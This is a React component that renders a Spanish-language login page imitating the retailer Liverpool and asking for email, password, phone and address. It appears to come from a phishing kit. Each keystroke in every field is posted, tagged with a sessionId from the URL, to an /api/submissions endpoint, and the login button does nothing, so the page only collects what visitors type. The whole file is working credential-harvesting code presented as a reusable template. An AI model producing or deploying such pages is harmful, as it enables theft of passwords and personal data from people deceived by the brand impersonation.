import { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { apiRequest } from "@/lib/queryClient";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

export default function LiverpoolTemplate() {
  const [location] = useLocation();
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");
  
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    phone: "",
    address: "",
  });

  const submitDataMutation = useMutation({
    mutationFn: async (data: { fieldName: string; fieldValue: string }) => {
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        ...data,
      });
      return response.json();
    },
  });

  const handleInputChange = (fieldName: string, value: string) => {
    setFormData(prev => ({ ...prev, [fieldName]: value }));
    
    if (value.trim() && sessionId) {
      submitDataMutation.mutate({ fieldName, fieldValue: value });
    }
  };

  return (
    <div className="template-container min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <div className="text-center mb-8">
          <div className="w-20 h-20 bg-red-600 rounded-lg flex items-center justify-center mx-auto mb-4">
            <span className="text-white font-bold text-3xl">L</span>
          </div>
          <h1 className="text-2xl font-bold text-gray-900 mb-2">Liverpool</h1>
          <p className="text-gray-600">Accede a tu cuenta</p>
        </div>

        <div className="bg-white rounded-lg shadow-lg p-6">
          <form className="space-y-4">
            <div>
              <Label htmlFor="email" className="text-gray-700">Email</Label>
              <Input
                id="email"
                type="email"
                value={formData.email}
                onChange={(e) => handleInputChange("email", e.target.value)}
                className="mt-1 bg-white border-gray-300 text-gray-900"
                placeholder="ejemplo@correo.com"
                data-testid="input-email"
              />
            </div>

            <div>
              <Label htmlFor="password" className="text-gray-700">Contraseña</Label>
              <Input
                id="password"
                type="password"
                value={formData.password}
                onChange={(e) => handleInputChange("password", e.target.value)}
                className="mt-1 bg-white border-gray-300 text-gray-900"
                placeholder="••••••••"
                data-testid="input-password"
              />
            </div>

            <div>
              <Label htmlFor="phone" className="text-gray-700">Teléfono</Label>
              <Input
                id="phone"
                value={formData.phone}
                onChange={(e) => handleInputChange("phone", e.target.value)}
                className="mt-1 bg-white border-gray-300 text-gray-900"
                placeholder="55-1234-5678"
                data-testid="input-phone"
              />
            </div>

            <div>
              <Label htmlFor="address" className="text-gray-700">Dirección</Label>
              <Input
                id="address"
                value={formData.address}
                onChange={(e) => handleInputChange("address", e.target.value)}
                className="mt-1 bg-white border-gray-300 text-gray-900"
                placeholder="Calle, Número, Colonia"
                data-testid="input-address"
              />
            </div>

            <Button 
              type="button"
              className="w-full bg-red-600 hover:bg-red-700 text-white"
              data-testid="button-submit"
            >
              Iniciar Sesión
            </Button>
          </form>

          <div className="mt-6 text-center space-y-2">
            <a href="#" className="block text-sm text-red-600 hover:underline">
              ¿Olvidaste tu contraseña?
            </a>
            <a href="#" className="block text-sm text-red-600 hover:underline">
              Crear cuenta nueva
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
